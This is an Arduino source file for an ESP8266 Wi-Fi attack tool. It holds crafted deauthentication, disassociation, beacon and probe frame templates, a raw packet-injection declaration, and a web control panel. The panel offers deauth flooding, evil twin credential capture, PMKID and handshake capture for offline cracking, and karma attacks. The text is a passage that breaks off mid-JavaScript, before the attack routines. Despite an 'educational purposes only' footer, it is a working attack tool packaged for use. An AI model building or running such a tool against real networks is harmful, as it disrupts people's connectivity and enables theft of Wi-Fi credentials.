
/*
 * 0x0806 WiFi Deauther - Advanced All-in-One Edition
 * Developed by 0x0806
 * 
 * This software is licensed under the MIT License
 * Most advanced WiFi security testing tool - all in one .ino
 */

extern "C" {
  #include "user_interface.h"
  #include "espnow.h"
  typedef void (*freedom_outside_cb_t)(uint8_t status);
  int wifi_send_pkt_freedom(uint8_t *buf, int len, bool sys_seq);
}

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <EEPROM.h>

// LittleFS compatibility check
#if defined(ESP8266)
  #include <LittleFS.h>
  #define FILESYSTEM LittleFS
#else
  #include <SPIFFS.h>
  #define FILESYSTEM SPIFFS
#endif

#include <vector>
#include <algorithm>
#include <functional>

// Helper function for min (avoid conflicts with std::min)
template<typename T>
T minVal(T a, T b) {
  return (a < b) ? a : b;
}

// Configuration
#define DEAUTHER_VERSION "v5.0.0-Advanced-0x0806"
#define AP_SSID "0x0806-WiFi-Deauther"
#define AP_PASS "deauther"
#define LED_PIN 2
#define BUTTON_PIN 0
#define MAX_SSIDS 12
#define MAX_STATIONS 12

// Web server and DNS
ESP8266WebServer server(80);
DNSServer dnsServer;

// Attack variables
bool attacking = false;
bool scanning = false;
bool beaconSpam = false;
bool probeAttack = false;
bool captivePortal = true;
bool packetMonitor = false;
bool evilTwinAttack = false;
bool pmkidAttack = false;
bool karmaAttack = false;
bool wpsAttack = false;
bool mitm_attack = false;
bool handshakeCapture = false;
bool aggressiveMode = false;

// Properly structured deauth packet (26 bytes)
uint8_t deauthPacket[26] = {
  0xC0, 0x00,                         // Frame Control (Deauth)
  0x3A, 0x01,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC (will be replaced)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (will be replaced)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will be replaced)
  0x70, 0x6A,                         // Sequence Control
  0x01, 0x00                          // Reason Code (Unspecified)
};

// Properly structured disassoc packet (26 bytes)
uint8_t disassocPacket[26] = {
  0xA0, 0x00,                         // Frame Control (Disassoc)
  0x3A, 0x01,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x70, 0x6A,                         // Sequence Control
  0x01, 0x00                          // Reason Code
};

// Properly structured beacon packet template
uint8_t beaconPacket[109] = {
  0x80, 0x00,                         // Frame Control (Beacon)
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC (will be replaced)
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID
  0x00, 0x00,                         // Sequence Control
  // Fixed parameters
  0x83, 0x1A, 0xF7, 0x8C, 0x7E, 0x00, 0x00, 0x00, // Timestamp
  0x64, 0x00,                         // Beacon Interval
  0x01, 0x04,                         // Capability Info
  // Variable parameters (SSID)
  0x00, 0x08,                         // SSID Element ID and Length
  'F', 'R', 'E', 'E', 'W', 'I', 'F', 'I', // SSID
  // Supported Rates
  0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
  // DS Parameter Set
  0x03, 0x01, 0x06,
  // Country Information
  0x07, 0x06, 0x55, 0x53, 0x20, 0x01, 0x0B, 0x1E
};

// Probe request packet
uint8_t probePacket[82] = {
  0x40, 0x00,                         // Frame Control (Probe Request)
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC (will be replaced)
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID (Broadcast)
  0x00, 0x00,                         // Sequence Control
  // SSID element
  0x00, 0x06, 't', 'e', 's', 't', 'e', 'r',
  // Supported Rates
  0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
  // Extended Supported Rates
  0x32, 0x04, 0x0C, 0x12, 0x18, 0x60,
  // DS Parameter Set
  0x03, 0x01, 0x06,
  // HT Capabilities
  0x2D, 0x1A, 0xEF, 0x09, 0x1B, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Authentication packet
uint8_t authPacket[30] = {
  0xB0, 0x00,                         // Frame Control (Authentication)
  0x3A, 0x01,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x70, 0x6A,                         // Sequence Control
  0x00, 0x00,                         // Auth Algorithm (Open System)
  0x01, 0x00,                         // Auth Transaction Sequence
  0x00, 0x00                          // Status Code
};

// Association request packet
uint8_t assocPacket[30] = {
  0x00, 0x00,                         // Frame Control (Association Request)
  0x3A, 0x01,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x70, 0x6A,                         // Sequence Control
  0x31, 0x04,                         // Capability Info
  0x00, 0x00                          // Listen Interval
};

// Network data structures
struct AccessPoint {
  String ssid;
  int channel;
  int rssi;
  String bssid;
  bool selected;
  bool hidden;
  String encryption;
  uint8_t bssid_bytes[6];
  bool hasClients;
  int clientCount;
};

struct Station {
  String mac;
  String ap_mac;
  int channel;
  int rssi;
  bool selected;
  uint8_t mac_bytes[6];
  uint8_t ap_mac_bytes[6];
  unsigned long lastSeen;
};

struct SSIDData {
  String ssid;
  bool enabled;
  bool wpa2;
  bool hidden;
  int channel;
};

std::vector<AccessPoint> accessPoints;
std::vector<Station> stations;
std::vector<SSIDData> ssidList;
int selectedAPs = 0;
int selectedStations = 0;
int packetsPerSecond = 50;
unsigned long totalPackets = 0;
unsigned long attackStartTime = 0;

// Enhanced statistics
struct Stats {
  unsigned long deauthPackets = 0;
  unsigned long disassocPackets = 0;
  unsigned long beaconPackets = 0;
  unsigned long probePackets = 0;
  unsigned long authPackets = 0;
  unsigned long assocPackets = 0;
  unsigned long capturedPackets = 0;
  unsigned long uniqueDevices = 0;
  unsigned long handshakes = 0;
  unsigned long pmkids = 0;
  unsigned long evilTwinClients = 0;
};
Stats stats;

// Enhanced fake WiFi SSIDs for beacon spam
const char* fakeSSIDs[] PROGMEM = {
  "FREE_WIFI_SECURE",
  "FBI_Surveillance_Van",
  "Router_McRouterface",
  "Tell_My_WiFi_Love_Her",
  "404_Network_Unavailable",
  "Wu_Tang_LAN",
  "Loading...",
  "PASSWORD_IS_PASSWORD",
  "Get_Your_Own_WiFi",
  "No_Internet_Here",
  "Connecting...",
  "VIRUS_DETECTED"
};

// Function prototypes
void startAP();
void handleRoot();
void handleScan();
void handleAttack();
void handleStop();
void handleBeacon();
void handleProbe();
void handleSSIDs();
void handleMonitor();
void handleStats();
void handleAPI();
void handleCaptive();
void scanNetworks();
void performAttack();
void performAdvancedAttack();
void performBeaconSpam();
void performProbeAttack();
void performEvilTwin();
void performKarmaAttack();
void performMitmAttack();
void performHandshakeCapture();
void packetSniffer(uint8_t *buf, uint16_t len);
void updateLED();
void saveSettings();
void loadSettings();
bool sendPacketSafely(uint8_t* packet, uint16_t len);
void parseMAC(String macStr, uint8_t* macBytes);

const char htmlPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>0x0806 WiFi Deauther - Advanced</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700;800&display=swap');
        
        :root {
            --bg-primary: #0d1117;
            --bg-secondary: #161b22;
            --bg-tertiary: #21262d;
            --border-primary: #30363d;
            --border-secondary: #21262d;
            --text-primary: #e6edf3;
            --text-secondary: #7d8590;
            --text-muted: #656d76;
            --accent-primary: #f85149;
            --accent-secondary: #ff6b35;
            --accent-tertiary: #ffa500;
            --success: #238636;
            --warning: #d29922;
            --danger: #da3633;
            --info: #1f6feb;
            --shadow: rgba(0, 0, 0, 0.4);
            --shadow-heavy: rgba(0, 0, 0, 0.8);
            --gradient-primary: linear-gradient(135deg, #f85149, #ff6b35);
            --gradient-secondary: linear-gradient(135deg, #ffa500, #ff6b35);
            --gradient-danger: linear-gradient(135deg, #da3633, #f85149);
            --gradient-success: linear-gradient(135deg, #238636, #2ea043);
            --gradient-warning: linear-gradient(135deg, #d29922, #ffa500);
            --gradient-info: linear-gradient(135deg, #1f6feb, #388bfd);
            --glow-primary: 0 0 20px rgba(248, 81, 73, 0.3);
            --glow-secondary: 0 0 20px rgba(255, 107, 53, 0.3);
            --glow-danger: 0 0 20px rgba(218, 54, 51, 0.3);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'JetBrains Mono', monospace;
            background: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 1rem;
            min-height: 100vh;
        }

        .header {
            text-align: center;
            margin-bottom: 2rem;
            background: var(--bg-secondary);
            border: 1px solid var(--border-primary);
            border-radius: 12px;
            padding: 2rem;
            box-shadow: 0 8px 32px var(--shadow);
        }

        .logo {
            font-size: 2.5rem;
            font-weight: 800;
            background: var(--gradient-primary);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 0.5rem;
        }

        .tagline {
            color: var(--text-secondary);
            font-size: 1rem;
            margin-bottom: 1rem;
        }

        .version {
            background: var(--gradient-primary);
            color: white;
            padding: 0.5rem 1rem;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
        }

        .nav-tabs {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 0.5rem;
            margin-bottom: 2rem;
            padding: 1rem;
            background: var(--bg-secondary);
            border: 1px solid var(--border-primary);
            border-radius: 12px;
        }

        .nav-tab {
            padding: 0.8rem 1rem;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-secondary);
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
            color: var(--text-secondary);
            text-align: center;
            font-size: 0.85rem;
        }

        .nav-tab:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 16px var(--shadow);
            border-color: var(--accent-primary);
        }

        .nav-tab.active {
            background: var(--gradient-primary);
            color: white;
            border-color: var(--accent-primary);
            box-shadow: var(--glow-primary);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1rem;
            margin-bottom: 2rem;
        }

        .card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-primary);
            border-radius: 12px;
            padding: 1.5rem;
            box-shadow: 0 8px 32px var(--shadow);
            transition: all 0.3s ease;
        }

        .card:hover {
            transform: translateY(-4px);
            box-shadow: 0 12px 48px var(--shadow-heavy);
            border-color: var(--accent-primary);
        }

        .card-title {
            font-size: 1.2rem;
            font-weight: 700;
            margin-bottom: 1rem;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .card-title::before {
            content: '';
            width: 4px;
            height: 20px;
            background: var(--gradient-primary);
            border-radius: 2px;
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            padding: 0.8rem 1.2rem;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 0.85rem;
            margin: 0.25rem;
            min-width: 120px;
            font-family: inherit;
        }

        .btn-primary { 
            background: var(--gradient-primary); 
            color: white; 
            box-shadow: var(--glow-primary);
        }
        
        .btn-secondary { 
            background: var(--gradient-secondary); 
            color: white; 
            box-shadow: var(--glow-secondary);
        }
        
        .btn-danger { 
            background: var(--gradient-danger); 
            color: white; 
            box-shadow: var(--glow-danger);
        }
        
        .btn-success { 
            background: var(--gradient-success); 
            color: white; 
        }
        
        .btn-warning { 
            background: var(--gradient-warning); 
            color: white; 
        }

        .btn-info { 
            background: var(--gradient-info); 
            color: white; 
        }

        .btn:hover {
            transform: translateY(-2px);
            filter: brightness(1.1);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }

        .status {
            padding: 1rem;
            border-radius: 8px;
            margin: 1rem 0;
            font-weight: 600;
            text-align: center;
            border: 1px solid;
        }

        .status-idle { 
            background: rgba(31, 111, 235, 0.1); 
            color: var(--info); 
            border-color: var(--info); 
        }
        
        .status-scanning { 
            background: rgba(210, 153, 34, 0.1); 
            color: var(--warning); 
            border-color: var(--warning); 
        }
        
        .status-attacking { 
            background: rgba(218, 54, 51, 0.1); 
            color: var(--danger); 
            border-color: var(--danger); 
        }
        
        .status-active { 
            background: rgba(35, 134, 54, 0.1); 
            color: var(--success); 
            border-color: var(--success); 
        }

        .network-list {
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid var(--border-primary);
            border-radius: 8px;
            margin-top: 1rem;
            background: var(--bg-tertiary);
        }

        .network-item {
            display: flex;
            align-items: center;
            padding: 1rem;
            border-bottom: 1px solid var(--border-secondary);
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .network-item:hover { 
            background: var(--bg-secondary); 
            transform: translateX(4px);
        }
        
        .network-item.selected { 
            background: rgba(248, 81, 73, 0.1); 
            border-color: var(--accent-primary); 
        }

        .network-checkbox { 
            margin-right: 1rem;
            transform: scale(1.2);
            accent-color: var(--accent-primary);
        }

        .network-info { 
            flex: 1; 
        }

        .network-ssid {
            font-weight: 700;
            color: var(--text-primary);
            font-size: 1rem;
            margin-bottom: 0.25rem;
        }

        .network-details {
            font-size: 0.8rem;
            color: var(--text-secondary);
            display: flex;
            gap: 1rem;
            flex-wrap: wrap;
        }

        .signal-strength {
            width: 80px;
            text-align: right;
            font-weight: 700;
            font-size: 0.85rem;
        }

        .signal-strong { 
            color: var(--success); 
        }
        
        .signal-medium { 
            color: var(--warning); 
        }
        
        .signal-weak { 
            color: var(--danger); 
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 1rem;
            margin-top: 1rem;
        }

        .stat-item {
            text-align: center;
            padding: 1rem;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-secondary);
            border-radius: 8px;
            transition: all 0.3s ease;
        }

        .stat-item:hover {
            transform: translateY(-2px);
            border-color: var(--accent-primary);
        }

        .stat-value {
            font-size: 1.5rem;
            font-weight: 800;
            color: var(--accent-primary);
            margin-bottom: 0.25rem;
        }

        .stat-label {
            font-size: 0.75rem;
            color: var(--text-muted);
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        .input-group {
            margin: 1rem 0;
        }

        .input-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
            color: var(--text-primary);
        }

        .input-group input,
        .input-group select,
        .input-group textarea {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid var(--border-primary);
            border-radius: 6px;
            font-size: 0.85rem;
            transition: all 0.3s ease;
            background: var(--bg-tertiary);
            color: var(--text-primary);
            font-family: inherit;
        }

        .input-group input:focus,
        .input-group select:focus,
        .input-group textarea:focus {
            outline: none;
            border-color: var(--accent-primary);
            box-shadow: 0 0 0 2px rgba(248, 81, 73, 0.2);
        }

        .footer {
            text-align: center;
            margin-top: 2rem;
            padding: 2rem;
            background: var(--bg-secondary);
            border: 1px solid var(--border-primary);
            border-radius: 12px;
            color: var(--text-secondary);
        }

        .loading {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .badge {
            display: inline-block;
            padding: 0.2rem 0.5rem;
            border-radius: 12px;
            font-size: 0.7rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-left: 0.5rem;
        }

        .badge-danger { background: var(--gradient-danger); color: white; }
        .badge-warning { background: var(--gradient-warning); color: white; }
        .badge-success { background: var(--gradient-success); color: white; }
        .badge-info { background: var(--gradient-info); color: white; }
        .badge-secondary { background: var(--gradient-secondary); color: white; }

        @media (max-width: 768px) {
            .container { 
                padding: 0.5rem; 
            }
            .grid { 
                grid-template-columns: 1fr; 
            }
            .nav-tabs {
                grid-template-columns: repeat(2, 1fr);
            }
            .logo { 
                font-size: 2rem; 
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">0x0806 WiFi Deauther</div>
            <div class="tagline">Advanced WiFi Security Testing Framework</div>
            <div class="version">v5.0.0-Advanced-0x0806</div>
        </div>

        <div class="nav-tabs">
            <button class="nav-tab active" onclick="showTab('scanner')">Scanner</button>
            <button class="nav-tab" onclick="showTab('attacks')">Attacks</button>
            <button class="nav-tab" onclick="showTab('advanced')">Advanced</button>
            <button class="nav-tab" onclick="showTab('beacon')">Beacon</button>
            <button class="nav-tab" onclick="showTab('ssids')">SSIDs</button>
            <button class="nav-tab" onclick="showTab('monitor')">Monitor</button>
            <button class="nav-tab" onclick="showTab('stats')">Stats</button>
        </div>

        <!-- Scanner Tab -->
        <div id="scanner" class="tab-content active">
            <div class="grid">
                <div class="card">
                    <div class="card-title">Network Scanner</div>
                    <div id="status" class="status status-idle">System Ready</div>
                    <button onclick="scanNetworks()" class="btn btn-primary" id="scanBtn">
                        Scan Networks
                    </button>
                    <div class="stats">
                        <div class="stat-item">
                            <div class="stat-value" id="networkCount">0</div>
                            <div class="stat-label">Networks</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value" id="selectedCount">0</div>
                            <div class="stat-label">Selected</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value" id="stationCount">0</div>
                            <div class="stat-label">Stations</div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="card">
                <div class="card-title">Available Networks</div>
                <div style="display: flex; gap: 0.5rem; margin-bottom: 1rem; flex-wrap: wrap;">
                    <button onclick="selectAll()" class="btn btn-primary">Select All</button>
                    <button onclick="selectNone()" class="btn btn-secondary">Select None</button>
                    <button onclick="selectHidden()" class="btn btn-warning">Hidden Only</button>
                    <button onclick="selectWPA()" class="btn btn-info">WPA/WPA2</button>
                </div>
                <div id="networkList" class="network-list">
                    <div style="padding: 2rem; text-align: center; color: var(--text-muted);">
                        Click "Scan Networks" to discover nearby WiFi networks
                    </div>
                </div>
            </div>
        </div>

        <!-- Attacks Tab -->
        <div id="attacks" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">Deauthentication Attack</div>
                    <div class="input-group">
                        <label>Attack Intensity:</label>
                        <input type="range" id="ppsSlider" min="10" max="100" value="50" oninput="updatePPS(this.value)">
                        <span id="ppsValue">50</span> packets/second
                    </div>
                    <div class="input-group">
                        <label>
                            <input type="checkbox" id="aggressiveMode" onchange="toggleAggressive()"> 
                            Aggressive Mode
                        </label>
                    </div>
                    <button onclick="startDeauth()" class="btn btn-danger" id="deauthBtn" disabled>
                        Start Deauth Attack
                    </button>
                    <button onclick="stopAttack()" class="btn btn-success" id="stopBtn" disabled>
                        Stop All Attacks
                    </button>
                </div>

                <div class="card">
                    <div class="card-title">Target Information</div>
                    <div class="stats">
                        <div class="stat-item">
                            <div class="stat-value" id="targetAPs">0</div>
                            <div class="stat-label">Target APs</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value" id="targetStations">0</div>
                            <div class="stat-label">Stations</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value" id="totalTargets">0</div>
                            <div class="stat-label">Total Targets</div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card-title">Attack Statistics</div>
                <div class="stats">
                    <div class="stat-item">
                        <div class="stat-value" id="packetsCount">0</div>
                        <div class="stat-label">Packets Sent</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="uptime">00:00</div>
                        <div class="stat-label">Runtime</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="packetsPerSec">0</div>
                        <div class="stat-label">Current PPS</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="successRate">0%</div>
                        <div class="stat-label">Success Rate</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Advanced Attacks Tab -->
        <div id="advanced" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">Evil Twin Attack</div>
                    <p style="color: var(--text-secondary); margin-bottom: 1rem;">
                        Creates fake access points to capture credentials
                    </p>
                    <button onclick="startEvilTwin()" class="btn btn-danger" id="evilTwinBtn">
                        Start Evil Twin
                    </button>
                    <button onclick="stopEvilTwin()" class="btn btn-success" id="stopEvilTwinBtn" disabled>
                        Stop Evil Twin
                    </button>
                </div>

                <div class="card">
                    <div class="card-title">PMKID Attack</div>
                    <p style="color: var(--text-secondary); margin-bottom: 1rem;">
                        Attempts to capture PMKID for offline cracking
                    </p>
                    <button onclick="startPMKID()" class="btn btn-warning" id="pmkidBtn">
                        Start PMKID Capture
                    </button>
                    <button onclick="stopPMKID()" class="btn btn-success" id="stopPMKIDBtn" disabled>
                        Stop PMKID
                    </button>
                </div>

                <div class="card">
                    <div class="card-title">Karma Attack</div>
                    <p style="color: var(--text-secondary); margin-bottom: 1rem;">
                        Responds to all probe requests with fake APs
                    </p>
                    <button onclick="startKarma()" class="btn btn-warning" id="karmaBtn">
                        Start Karma Attack
                    </button>
                    <button onclick="stopKarma()" class="btn btn-success" id="stopKarmaBtn" disabled>
                        Stop Karma
                    </button>
                </div>

                <div class="card">
                    <div class="card-title">Handshake Capture</div>
                    <p style="color: var(--text-secondary); margin-bottom: 1rem;">
                        Captures WPA/WPA2 handshakes for analysis
                    </p>
                    <button onclick="startHandshake()" class="btn btn-info" id="handshakeBtn">
                        Start Handshake Capture
                    </button>
                    <button onclick="stopHandshake()" class="btn btn-success" id="stopHandshakeBtn" disabled>
                        Stop Handshake
                    </button>
                </div>
            </div>
        </div>

        <!-- Beacon Tab -->
        <div id="beacon" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">Beacon Spam</div>
                    <p style="color: var(--text-secondary); margin-bottom: 1rem;">
                        Creates multiple fake WiFi networks
                    </p>
                    <button onclick="startBeacon()" class="btn btn-warning" id="beaconBtn">
                        Start Beacon Spam
                    </button>
                    <button onclick="stopBeacon()" class="btn btn-success" id="stopBeaconBtn" disabled>
                        Stop Beacon
                    </button>
                </div>

                <div class="card">
                    <div class="card-title">Probe Attack</div>
                    <p style="color: var(--text-secondary); margin-bottom: 1rem;">
                        Sends probe requests to confuse tracking
                    </p>
                    <button onclick="startProbe()" class="btn btn-warning" id="probeBtn">
                        Start Probe Attack
                    </button>
                    <button onclick="stopProbe()" class="btn btn-success" id="stopProbeBtn" disabled>
                        Stop Probe
                    </button>
                </div>
            </div>
        </div>

        <!-- SSIDs Tab -->
        <div id="ssids" class="tab-content">
            <div class="card">
                <div class="card-title">SSID Management</div>
                <div class="input-group">
                    <label>Add Custom SSID:</label>
                    <input type="text" id="customSSID" placeholder="Enter SSID name" maxlength="32">
                    <button onclick="addSSID()" class="btn btn-primary">Add SSID</button>
                </div>
                <div id="ssidList" class="network-list">
                    <div style="padding: 2rem; text-align: center; color: var(--text-muted);">
                        Loading SSIDs...
                    </div>
                </div>
            </div>
        </div>

        <!-- Monitor Tab -->
        <div id="monitor" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">Packet Monitor</div>
                    <button onclick="startMonitor()" class="btn btn-primary" id="monitorBtn">
                        Start Monitor Mode
                    </button>
                    <button onclick="stopMonitor()" class="btn btn-success" id="stopMonitorBtn" disabled>
                        Stop Monitor
                    </button>
                </div>

                <div class="card">
                    <div class="card-title">Captured Data</div>
                    <div class="stats">
                        <div class="stat-item">
                            <div class="stat-value" id="capturedPackets">0</div>
                            <div class="stat-label">Packets</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value" id="uniqueDevices">0</div>
                            <div class="stat-label">Devices</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value" id="handshakesCount">0</div>
                            <div class="stat-label">Handshakes</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Stats Tab -->
        <div id="stats" class="tab-content">
            <div class="card">
                <div class="card-title">Advanced Statistics</div>
                <div class="stats">
                    <div class="stat-item">
                        <div class="stat-value" id="totalDeauth">0</div>
                        <div class="stat-label">Deauth Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="totalDisassoc">0</div>
                        <div class="stat-label">Disassoc Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="totalBeacon">0</div>
                        <div class="stat-label">Beacon Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="totalProbe">0</div>
                        <div class="stat-label">Probe Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="totalAuth">0</div>
                        <div class="stat-label">Auth Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="totalAssoc">0</div>
                        <div class="stat-label">Assoc Packets</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="systemUptime">00:00:00</div>
                        <div class="stat-label">System Uptime</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="memoryUsage">0%</div>
                        <div class="stat-label">Memory Usage</div>
                    </div>
                </div>
                <button onclick="resetStats()" class="btn btn-warning">Reset All Statistics</button>
            </div>
        </div>

        <div class="footer">
            <div>
                Developed by <strong style="color: var(--accent-primary);">0x0806</strong><br>
                Educational purposes only - Use responsibly
            </div>
        </div>
    </div>

    <script>
        var scanning = false;
        var attacking = false;
        var beaconSpamming = false;
        var probeAttacking = false;
        var monitoring = false;
        var evilTwinActive = false;
        var pmkidActive = false;
        var karmaActive = false;
        var handshakeActive = false;
        var networks = [];
        var stations = [];
        var ssids = [];
        var startTime = 0;
        var packetCount = 0;
        var systemStartTime = Date.now();
        var aggressiveModeEnabled = false;

        function showTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(function(tab) { 
                tab.classList.remove('active'); 
            });
            document.querySelectorAll('.nav-tab').forEach(function(tab) { 
                tab.classList.remove('active'); 
            });
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');

            if (tabName === 'ssids') loadSSIDs();
            if (tabName === 'stats') updateStats();
        }

        function updateStatus(message, type) {
            if (typeof type === 'undefined') type = 'idle';
            var status = document.getElementById('status');
            status.textContent = message;
            status.className = 'status status-' + type;
        }

        function updateUI() {
            var scanBtn = document.getElementById('scanBtn');
            var deauthBtn = document.getElementById('deauthBtn');
            var stopBtn = document.getElementById('stopBtn');

            if (scanBtn) scanBtn.disabled = scanning || attacking;
            if (deauthBtn) deauthBtn.disabled = scanning || attacking || getSelectedNetworks().length === 0;
            if (stopBtn) stopBtn.disabled = !attacking && !beaconSpamming && !probeAttacking && !evilTwinActive;

            if (scanning && scanBtn) {
                scanBtn.innerHTML = '<span class="loading"></span> Scanning...';
            } else if (scanBtn) {
                scanBtn.innerHTML = 'Scan Networks';
            }
        }

        function updatePPS(value) {
            var ppsValue = document.getElementById('ppsValue');
            if (ppsValue) ppsValue.textContent = value;
            
            fetch('/api/pps?value=' + value).catch(function(error) {
                console.log('PPS update failed:', error);
            });
        }

        function toggleAggressive() {
            aggressiveModeEnabled = document.getElementById('aggressiveMode').checked;
            fetch('/api/aggressive?value=' + (aggressiveModeEnabled ? '1' : '0')).catch(function(error) {
                console.log('Aggressive mode update failed:', error);
            });
        }

        function scanNetworks() {
            if (scanning) return;

            scanning = true;
            updateStatus('Advanced scanning in progress...', 'scanning');
            updateUI();

            fetch('/scan')
                .then(function(response) { 
                    if (!response.ok) throw new Error('Network error');
                    return response.json(); 
                })
                .then(function(data) {
                    networks = data.networks || [];
                    stations = data.stations || [];
                    renderNetworks();
                    updateCounts();
                    updateStatus('Found ' + networks.length + ' networks, ' + stations.length + ' stations', 'idle');
                })
                .catch(function(error) {
                    console.error('Scan error:', error);
                    updateStatus('Scan failed - retry', 'idle');
                })
                .finally(function() {
                    scanning = false;
                    updateUI();
                });
        }

        function renderNetworks() {
            var networkList = document.getElementById('networkList');
            if (!networkList) return;

            if (networks.length === 0) {
                networkList.innerHTML = '<div style="padding: 2rem; text-align: center; color: var(--text-muted);">No networks found</div>';
                return;
            }

            var html = '';
            for (var i = 0; i < networks.length; i++) {
                var network = networks[i];
                var signalClass = network.rssi > -50 ? 'signal-strong' : 
                                 network.rssi > -70 ? 'signal-medium' : 'signal-weak';

                var badges = '';
                if (network.hidden) badges += '<span class="badge badge-warning">HIDDEN</span>';
                if (network.encryption.includes('WPA')) badges += '<span class="badge badge-danger">WPA</span>';
                if (network.encryption === 'Open') badges += '<span class="badge badge-success">OPEN</span>';
                if (network.hasClients) badges += '<span class="badge badge-info">CLIENTS</span>';

                html += '<div class="network-item ' + (network.selected ? 'selected' : '') + '" onclick="toggleNetwork(' + i + ')">'
